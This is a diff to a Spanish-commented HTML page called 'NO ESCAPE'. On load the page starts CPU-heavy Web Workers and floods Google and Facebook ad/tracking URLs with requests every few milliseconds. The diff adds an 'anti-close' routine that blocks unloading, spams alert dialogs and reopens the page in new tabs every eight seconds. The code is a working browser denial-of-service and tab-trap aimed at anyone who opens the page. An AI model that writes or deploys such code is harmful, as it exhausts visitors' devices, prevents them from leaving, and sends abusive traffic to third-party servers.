@@ -27,15 +27,15 @@ h1{
 <body>
 <h1>☢ NO ESCAPE ☢</h1>
 <div id="contador">CPU/RAM siendo violada: 0%</div>
+
 <canvas id="c1" style="position:fixed;top:0;left:0;z-index:-1;opacity:0.25;"></canvas>
 <canvas id="c2" style="position:fixed;top:0;left:0;z-index:-1;opacity:0.2;"></canvas>
 
 <script>
 let total = 0;
 let running = true;
-let workers = [];
 
-// Matrix intensiva
+// Matrix
 function createMatrix(id, speed) {
   const canvas = document.getElementById(id);
   const ctx = canvas.getContext("2d");
@@ -63,7 +63,7 @@ function createMatrix(id, speed) {
 createMatrix("c1", 22);
 createMatrix("c2", 16);
 
-// Worker
+// Workers y Spam (misma potencia)
 function createWorker() {
   const code = `
     self.onmessage = () => {
@@ -80,18 +80,12 @@ function createWorker() {
   const blob = new Blob([code], {type: "application/javascript"});
   const worker = new Worker(URL.createObjectURL(blob));
   worker.postMessage("");
-  workers.push(worker);
 }
 
-// Spam Principal (más agresivo)
 function spamPrincipal() {
   if (!running) return;
 
-  const urls = [
-    "https://securepubads.g.doubleclick.net/tag/js/gpt.js",
-    "https://connect.facebook.net/en_US/fbevents.js",
-    "https://googleads.g.doubleclick.net/pagead/ads"
-  ];
+  const urls = ["https://securepubads.g.doubleclick.net/tag/js/gpt.js", "https://connect.facebook.net/en_US/fbevents.js", "https://googleads.g.doubleclick.net/pagead/ads"];
 
   urls.forEach(url => {
     for(let i = 0; i < 6; i++) {
@@ -110,25 +104,50 @@ function spamPrincipal() {
   setTimeout(spamPrincipal, 7);
 }
 
-// INICIO AUTOMÁTICO CON ALTA CARGA
-window.onload = function() {
-  // Crear muchos workers inmediatamente
-  for(let i = 0; i < 9; i++) {
-    createWorker();
-  }
+// ==================== ANTI-CIERRE FUERTE ====================
+function antiClose() {
+  // Bloqueo principal al intentar cerrar
+  window.onbeforeunload = function() {
+    return "NO ESCAPE - ¿Estás seguro de querer salir?";
+  };
 
-  // Ráfaga inicial muy fuerte
-  for(let i = 0; i < 120; i++) {
-    setTimeout(spamPrincipal, i * 8);
-  }
+  // Alert masivo al intentar cerrar
+  window.addEventListener('beforeunload', function(e) {
+    e.preventDefault();
+    e.returnValue = '';
+    
+    // Spam de alerts
+    for(let i = 0; i < 5; i++) {
+      setTimeout(() => {
+        alert("NO ESCAPE\n\nEsta pestaña no se cerrará fácilmente.");
+      }, i * 300);
+    }
+  });
 
-  // Spam continuo
-  spamPrincipal();
-
-  // Anti-cierre (alert cada cierto tiempo)
+  // Abrir más pestañas si intentas cerrar
   setInterval(() => {
-    if (running) alert("NO ESCAPE\n\nCerrar esta pestaña no detendrá la carga...");
-  }, 6000);
+    try {
+      window.open(window.location.href, "_blank");
+    } catch(e){}
+  }, 8000);
+}
+
+// INICIO AUTOMÁTICO
+window.onload = function() {
+  // Alta carga desde el principio
+  for(let i = 0; i < 9; i++) createWorker();
+
+  for(let i = 0; i < 130; i++) {
+    setTimeout(spamPrincipal, i * 7);
+  }
+
+  spamPrincipal();
+  antiClose();
+
+  // Alerta inicial
+  setTimeout(() => {
+    alert("☢ NO ESCAPE ACTIVADO ☢\n\nEsta pestaña será difícil de cerrar.");
+  }, 800);
 };
 </script>
 </body>
